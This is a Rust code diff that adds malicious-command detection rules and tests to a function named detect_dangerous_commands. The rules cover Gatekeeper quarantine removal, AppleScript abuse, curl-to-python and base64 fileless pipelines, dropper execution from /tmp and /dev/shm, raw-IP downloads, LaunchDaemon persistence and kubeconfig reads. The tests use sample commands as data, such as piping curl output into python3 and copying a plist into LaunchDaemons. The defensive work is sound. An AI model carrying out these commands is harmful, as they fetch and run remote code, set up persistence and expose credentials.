@@ -705,6 +705,44 @@ fn detect_dangerous_commands(cmdline: &str, working_dir: &str) -> Vec<&'static s
     let lower = cmdline.to_ascii_lowercase();
     let mut hits = Vec::new();
 
+    if (lower.contains("xattr -c ") || lower.contains("xattr -c\t"))
+        || (lower.contains("xattr ")
+            && lower.contains("-d com.apple.quarantine")
+            && !lower.contains("-rd com.apple.quarantine"))
+        || (lower.contains("xattr ") && lower.contains("-rd com.apple.quarantine"))
+    {
+        hits.push("gatekeeper_bypass");
+    }
+
+    if lower.contains("osascript") && lower.contains("/tmp/") {
+        hits.push("osascript_tmp_exec");
+    }
+
+    if lower.contains("osascript")
+        && lower.contains(" -e ")
+        && (lower.contains("system events")
+            || lower.contains("keystroke")
+            || lower.contains("password"))
+    {
+        hits.push("osascript_inline_sensitive");
+    }
+
+    if lower.contains("osacompile") && lower.contains("curl ") {
+        hits.push("osacompile_with_curl");
+    }
+
+    if lower.contains("curl ")
+        && lower.contains("|")
+        && lower.contains("base64 -d")
+        && lower.contains("gunzip")
+    {
+        hits.push("fileless_pipeline_decode");
+    }
+
+    if lower.contains("curl ") && (lower.contains("| python3") || lower.contains("| python")) {
+        hits.push("fileless_pipeline_python");
+    }
+
     if (lower.contains("curl ")
         || lower.contains("wget ")
         || lower.contains("fetch ")
@@ -757,9 +795,58 @@ fn detect_dangerous_commands(cmdline: &str, working_dir: &str) -> Vec<&'static s
             || lower.contains("curl ")
             || lower.contains("wget ")
             || lower.contains("/tmp/")
+            || lower.contains("/dev/shm/")
             || working_dir.starts_with("/tmp"))
     {
         hits.push("download_exec");
+    }
+
+    if lower.contains("chmod +x")
+        && (lower.contains("/tmp/") || lower.contains("/dev/shm/"))
+        && (lower.contains("curl ") || lower.contains("wget ") || lower.contains("http://"))
+    {
+        hits.push("download_exec_tmpdir");
+    }
+
+    if lower.contains("/tmp/") || lower.contains("/dev/shm/") {
+        let tokens: Vec<&str> = lower.split_whitespace().collect();
+        if let Some(first) = tokens.first().copied() {
+            if first.starts_with("/tmp/")
+                || first.starts_with("/dev/shm/")
+                || ((first == "bash"
+                    || first == "sh"
+                    || first == "zsh"
+                    || first == "python"
+                    || first == "python3")
+                    && tokens
+                        .get(1)
+                        .is_some_and(|next| next.starts_with("/tmp/") || next.starts_with("/dev/shm/")))
+            {
+                hits.push("exec_tmpdir");
+            }
+        }
+    }
+
+    if lower.contains("curl ")
+        && has_non_rfc1918_ipv4_url(&lower, "curl")
+        && !hits.contains(&"curl_raw_ip")
+    {
+        hits.push("curl_raw_ip");
+    }
+
+    if lower.contains("wget ")
+        && has_non_rfc1918_ipv4_url(&lower, "wget")
+        && !hits.contains(&"wget_raw_ip")
+    {
+        hits.push("wget_raw_ip");
+    }
+
+    if writes_launchd_paths(&lower) {
+        hits.push("launchd_persistence");
+    }
+
+    if reads_kube_config(&lower) {
+        hits.push("kube_config_access");
     }
 
     if (lower.contains("touch ") || lower.contains("mkdir ")) && references_sensitive_paths(&lower)
@@ -838,6 +925,67 @@ fn references_sensitive_paths(text: &str) -> bool {
     text.contains("/etc/") || text.contains("/usr/bin/") || text.contains("/bin/")
 }
 
+fn has_non_rfc1918_ipv4_url(cmdline: &str, tool_name: &str) -> bool {
+    cmdline
+        .split_whitespace()
+        .any(|token| {
+            if !token.starts_with("http://") && !token.starts_with("https://") {
+                return false;
+            }
+            let host = token
+                .trim_start_matches("http://")
+                .trim_start_matches("https://")
+                .split('/')
+                .next()
+                .unwrap_or_default()
+                .split(':')
+                .next()
+                .unwrap_or_default()
+                .trim_matches(|c| c == '[' || c == ']');
+            let Some((a, b, _, _)) = parse_ipv4_octets(host) else {
+                return false;
+            };
+            if a == 10 {
+                return false;
+            }
+            if a == 172 && (16..=31).contains(&b) {
+                return false;
+            }
+            if a == 192 && b == 168 {
+                return false;
+            }
+            cmdline.contains(tool_name)
+        })
+}
+
+fn writes_launchd_paths(cmdline: &str) -> bool {
+    if !cmdline.contains("/library/launchdaemons/")
+        && !cmdline.contains("~/library/launchagents/")
+        && !cmdline.contains("/users/")
+        && !cmdline.contains("/library/launchagents/")
+    {
+        return false;
+    }
+    if cmdline.contains("/users/") && !cmdline.contains("/library/launchagents/") {
+        return false;
+    }
+
+    cmdline.contains(" > ")
+        || cmdline.contains(" >> ")
+        || cmdline.contains("tee ")
+        || cmdline.contains("cp ")
+        || cmdline.contains("mv ")
+        || cmdline.contains("install ")
+        || cmdline.contains("cat ")
+        || cmdline.contains("echo ")
+}
+
+fn reads_kube_config(cmdline: &str) -> bool {
+    cmdline.contains("~/.kube/config")
+        || cmdline.contains("/.kube/config")
+        || cmdline.contains("$home/.kube/config")
+}
+
 fn parse_ipv4_octets(host: &str) -> Option<(u8, u8, u8, u8)> {
     let mut parts = host.split('.');
     let a = parts.next()?.parse::<u8>().ok()?;
@@ -914,6 +1062,98 @@ mod tests {
         assert!(
             hits.contains(&"download_pipe_shell"),
             "curl pipe bash should be flagged as download_pipe_shell"
+        );
+    }
+
+    #[test]
+    fn detects_gatekeeper_bypass_patterns() {
+        assert!(detect_dangerous_commands("xattr -c /tmp/payload", "/").contains(&"gatekeeper_bypass"));
+        assert!(detect_dangerous_commands(
+            "xattr -d com.apple.quarantine /tmp/payload",
+            "/"
+        )
+        .contains(&"gatekeeper_bypass"));
+        assert!(detect_dangerous_commands(
+            "xattr -rd com.apple.quarantine /Applications/Fake.app",
+            "/"
+        )
+        .contains(&"gatekeeper_bypass"));
+    }
+
+    #[test]
+    fn detects_applescript_abuse_patterns() {
+        assert!(
+            detect_dangerous_commands("osascript /tmp/stage.scpt", "/").contains(&"osascript_tmp_exec")
+        );
+        assert!(detect_dangerous_commands(
+            "osascript -e 'tell application \"System Events\" to keystroke \"password\"'",
+            "/"
+        )
+        .contains(&"osascript_inline_sensitive"));
+        assert!(detect_dangerous_commands("curl -fsSL https://x/y | osacompile -o /tmp/x.scpt", "/")
+            .contains(&"osacompile_with_curl"));
+    }
+
+    #[test]
+    fn detects_fileless_execution_pipelines() {
+        assert!(detect_dangerous_commands(
+            "curl -fsSL http://example.com/a | base64 -d | gunzip",
+            "/"
+        )
+        .contains(&"fileless_pipeline_decode"));
+        assert!(
+            detect_dangerous_commands("curl -fsSL http://example.com/a | python3", "/")
+                .contains(&"fileless_pipeline_python")
+        );
+        assert!(
+            detect_dangerous_commands("curl -fsSL http://example.com/a | python", "/")
+                .contains(&"fileless_pipeline_python")
+        );
+    }
+
+    #[test]
+    fn detects_download_and_execute_from_temp_dirs() {
+        assert!(detect_dangerous_commands(
+            "curl -o /tmp/dropper http://example.com/d && chmod +x /tmp/dropper",
+            "/"
+        )
+        .contains(&"download_exec_tmpdir"));
+        assert!(
+            detect_dangerous_commands("/dev/shm/runner", "/").contains(&"exec_tmpdir")
+        );
+    }
+
+    #[test]
+    fn detects_raw_ip_downloads_for_curl_and_wget() {
+        assert!(detect_dangerous_commands("curl -O http://8.8.8.8/payload", "/")
+            .contains(&"curl_raw_ip"));
+        assert!(
+            detect_dangerous_commands("wget http://1.2.3.4/tool", "/").contains(&"wget_raw_ip")
+        );
+        assert!(
+            !detect_dangerous_commands("curl -O http://10.1.2.3/payload", "/")
+                .contains(&"curl_raw_ip")
+        );
+    }
+
+    #[test]
+    fn detects_launchdaemon_and_launchagent_persistence_writes() {
+        assert!(detect_dangerous_commands(
+            "cp payload.plist /Library/LaunchDaemons/com.bad.plist",
+            "/"
+        )
+        .contains(&"launchd_persistence"));
+        assert!(detect_dangerous_commands(
+            "echo plist > ~/Library/LaunchAgents/com.bad.plist",
+            "/"
+        )
+        .contains(&"launchd_persistence"));
+    }
+
+    #[test]
+    fn detects_kubernetes_config_access() {
+        assert!(
+            detect_dangerous_commands("cat ~/.kube/config", "/").contains(&"kube_config_access")
         );
     }
 
